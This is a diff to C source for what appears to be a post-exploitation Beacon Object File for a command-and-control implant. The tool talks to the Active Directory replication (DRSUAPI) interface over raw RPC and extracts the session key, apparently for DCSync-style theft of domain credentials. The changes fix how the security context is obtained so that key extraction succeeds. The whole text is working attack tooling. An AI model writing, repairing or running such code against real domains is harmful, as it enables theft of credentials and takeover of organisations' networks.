@@ -35,8 +35,8 @@ DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcSendReceive(void*);
 DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcFreeBuffer(void*);
 DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcBindingInqSecurityContext(
     RPC_BINDING_HANDLE, void**);
-DECLSPEC_IMPORT void RPC_ENTRY RPCRT4$NDRCContextUnmarshall(
-    void**, RPC_BINDING_HANDLE, void*, ULONG);
+DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingBind(
+    void*, RPC_BINDING_HANDLE, void*);
 
 /* ── ntdsapi.dll ── */
 DECLSPEC_IMPORT DWORD WINAPI NTDSAPI$DsBindW(LPCWSTR, LPCWSTR, HANDLE*);
@@ -430,8 +430,7 @@ static RPC_STATUS rpc_call(RPC_BINDING_HANDLE hBind, DWORD opnum,
  *   phDrs  context_handle  20 bytes (4 attr + 16 UUID)
  *   return value  4 bytes
  */
-static int drsr_bind(RPC_BINDING_HANDLE hRpc, BYTE ctxHandle[20],
-                     void **clientCtx)
+static int drsr_bind(RPC_BINDING_HANDLE hRpc, BYTE ctxHandle[20])
 {
     BYTE req[128];
     DWORD p = 0;
@@ -487,13 +486,6 @@ static int drsr_bind(RPC_BINDING_HANDLE hRpc, BYTE ctxHandle[20],
     }
     ndr_rbytes(rb, &rp, rLen, ctxHandle, 20);
 
-    /* Create proper client context handle via NDRCContextUnmarshall.
-     * This associates the context handle with the connection's security
-     * context, so I_RpcBindingInqSecurityContext can find it later.
-     * Must be called BEFORE I_RpcFreeBuffer while connection is live. */
-    *clientCtx = NULL;
-    RPCRT4$NDRCContextUnmarshall(clientCtx, msg.Handle, ctxHandle, NDR_DATA_REP);
-
     /* return value */
     DWORD retVal = ndr_r32(rb, &rp, rLen);
     RPCRT4$I_RpcFreeBuffer(&msg);
@@ -509,22 +501,11 @@ static int drsr_bind(RPC_BINDING_HANDLE hRpc, BYTE ctxHandle[20],
  *  SECTION 7 — SESSION KEY EXTRACTION
  * ================================================================ */
 
-static int get_session_key(void *clientCtx, RPC_BINDING_HANDLE hRpc,
+static int get_session_key(RPC_BINDING_HANDLE hRpc,
                            BYTE *keyOut, DWORD *keyLen)
 {
     void *secCtx = NULL;
-    RPC_STATUS s;
-
-    /* Try the client context handle first (created by NDRCContextUnmarshall).
-     * It references the connection which has the SSPI security context. */
-    if (clientCtx) {
-        s = RPCRT4$I_RpcBindingInqSecurityContext(
-                (RPC_BINDING_HANDLE)clientCtx, &secCtx);
-    }
-    /* Fall back to raw binding handle */
-    if (!secCtx) {
-        s = RPCRT4$I_RpcBindingInqSecurityContext(hRpc, &secCtx);
-    }
+    RPC_STATUS s = RPCRT4$I_RpcBindingInqSecurityContext(hRpc, &secCtx);
     if (s || !secCtx) {
         BeaconPrintf(CALLBACK_ERROR,
             "[!] I_RpcBindingInqSecurityContext failed: 0x%08x\n", s);
@@ -1271,6 +1252,13 @@ void go(char *args, int args_len)
     if (rpcSt == 0) {
         rpcSt = RPCRT4$RpcEpResolveBinding(hRpc, (void*)&g_drsuapi_if);
     }
+    /* Explicitly bind the connection + SSPI handshake so the security
+     * context is populated on the binding handle.  Without this,
+     * I_RpcBindingInqSecurityContext cannot find the SSPI context
+     * because I_RpcGetBuffer/I_RpcSendReceive don't populate it. */
+    if (rpcSt == 0) {
+        rpcSt = RPCRT4$RpcBindingBind(NULL, hRpc, (void*)&g_drsuapi_if);
+    }
     if (rpcSt) {
         BeaconPrintf(CALLBACK_ERROR,
             "[!] RPC binding failed: 0x%08x\n", rpcSt);
@@ -1281,9 +1269,8 @@ void go(char *args, int args_len)
     /* ── Step 4: DRSBind ── */
     BYTE ctxHandle[20];
     MSVCRT$memset(ctxHandle, 0, 20);
-    void *clientCtx = NULL;
 
-    if (!drsr_bind(hRpc, ctxHandle, &clientCtx)) {
+    if (!drsr_bind(hRpc, ctxHandle)) {
         RPCRT4$RpcBindingFree(&hRpc);
         return;
     }
@@ -1292,7 +1279,7 @@ void go(char *args, int args_len)
     /* ── Step 5: Get session key ── */
     BYTE sessKey[64];
     DWORD sessKeyLen = 0;
-    if (!get_session_key(clientCtx, hRpc, sessKey, &sessKeyLen)) {
+    if (!get_session_key(hRpc, sessKey, &sessKeyLen)) {
         RPCRT4$RpcBindingFree(&hRpc);
         return;
     }
